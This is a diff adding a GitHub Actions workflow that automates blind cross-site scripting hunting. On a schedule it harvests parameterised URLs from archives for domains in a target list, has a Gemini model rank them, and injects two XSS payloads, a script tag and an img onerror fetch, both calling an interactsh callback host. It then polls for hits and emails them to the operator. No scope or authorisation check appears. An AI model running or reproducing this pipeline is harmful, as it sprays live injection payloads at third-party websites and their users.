@@ -1,0 +1,105 @@
+name: "Blind XSS Hunter with AI Triage"
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_count:
+        description: 'Number of targets to scan'
+        required: false
+        default: '3'
+      use_ai_triage:
+        description: 'Use AI to prioritize URLs'
+        required: false
+        default: true
+        type: boolean
+  schedule:
+    - cron: '0 6 * * 2,4,6'
+
+jobs:
+  bxss-scan:
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v4
+        
+      - name: Setup Tools
+        run: |
+          go install github.com/tomnomnom/waybackurls@latest
+          go install github.com/tomnomnom/qsreplace@latest
+          go install github.com/lc/gau/v2/cmd/gau@latest
+          go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
+          pip install uro google-generativeai
+          echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
+        
+      - name: Setup OAST Session
+        shell: bash
+        run: |
+          mkdir -p tmp results reports
+          # Mapping the secret into the file correctly
+          echo "${{ secrets.OAST_SESSION_FILE }}" > tmp/sessions.yml
+          OAST_URL=$(grep -oP "[a-z0-9]{20,}\.(oast\.[a-z]+|interact\.sh)" tmp/sessions.yml | head -1)
+          echo "OAST_URL=$OAST_URL" >> $GITHUB_ENV
+
+      - name: Collect URLs
+        shell: bash
+        env:
+          TARGET_COUNT: ${{ github.event.inputs.target_count }}
+        run: |
+          shuf -n "$TARGET_COUNT" targets.txt > tmp/active_targets.txt
+          while read -r domain; do
+            [[ -z "$domain" ]] && continue
+            (waybackurls "$domain" 2>/dev/null; gau "$domain" --threads 5 2>/dev/null) >> tmp/all_urls.txt
+          done < tmp/active_targets.txt
+          cat tmp/all_urls.txt | grep "=" | uro --filters hasparams > tmp/filtered.txt || true
+
+      - name: AI Triage
+        if: github.event.inputs.use_ai_triage == true
+        shell: bash
+        env:
+          GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
+        run: |
+          if [[ -z "$GEMINI_API_KEY" ]]; then
+            cp tmp/filtered.txt tmp/final_targets.txt
+          else
+            python3 ai_triage.py tmp/filtered.txt tmp/
+            cat tmp/high_priority.txt tmp/medium_priority.txt > tmp/final_targets.txt || cp tmp/filtered.txt tmp/final_targets.txt
+          fi
+
+      - name: Inject Payloads
+        shell: bash
+        run: |
+          # Use variations to track which context triggers the hit
+          PAYLOADS=("\"><script src=\"https://$OAST_URL/1\"></script>" "'><img src=x onerror=\"fetch('https://$OAST_URL/2')\">")
+          for payload in "${PAYLOADS[@]}"; do
+            cat tmp/final_targets.txt | qsreplace "$payload" | xargs -I {} -P 15 curl -sk -L -m 8 -A "Mozilla/5.0" "{}" -o /dev/null 2>/dev/null
+          done
+
+      - name: Poll OAST
+        shell: bash
+        env:
+          # Required for interactsh-client authentication
+          INTERACTSH_TOKEN: ${{ secrets.INTERACTSH_TOKEN }}
+        run: |
+          interactsh-client -sf tmp/sessions.yml -poll-interval 5 -duration 1 -v > tmp/oast_raw.log || true
+          if grep -qiE "http|dns" tmp/oast_raw.log; then
+            echo "HAS_HITS=true" >> $GITHUB_ENV
+            printf "🚨 BLIND XSS HIT\nTime: $(date)\n\n$(cat tmp/oast_raw.log)" > reports/hits_summary.txt
+          fi
+
+      - name: Send Alert
+        # FIXED: Using environment variables for the IF check
+        if: env.HAS_HITS == 'true' && env.EMAIL_CHECK != ''
+        uses: dawidd6/action-send-mail@v3
+        env:
+          EMAIL_CHECK: ${{ secrets.EMAIL_USERNAME }}
+        with:
+          server_address: smtp.gmail.com
+          server_port: 465
+          username: ${{ secrets.EMAIL_USERNAME }}
+          password: ${{ secrets.EMAIL_PASSWORD }}
+          subject: "🚨 BLIND XSS HIT DETECTED"
+          to: ${{ secrets.EMAIL_USERNAME }}
+          from: "BXSS Hunter"
+          body: file://reports/hits_summary.txt
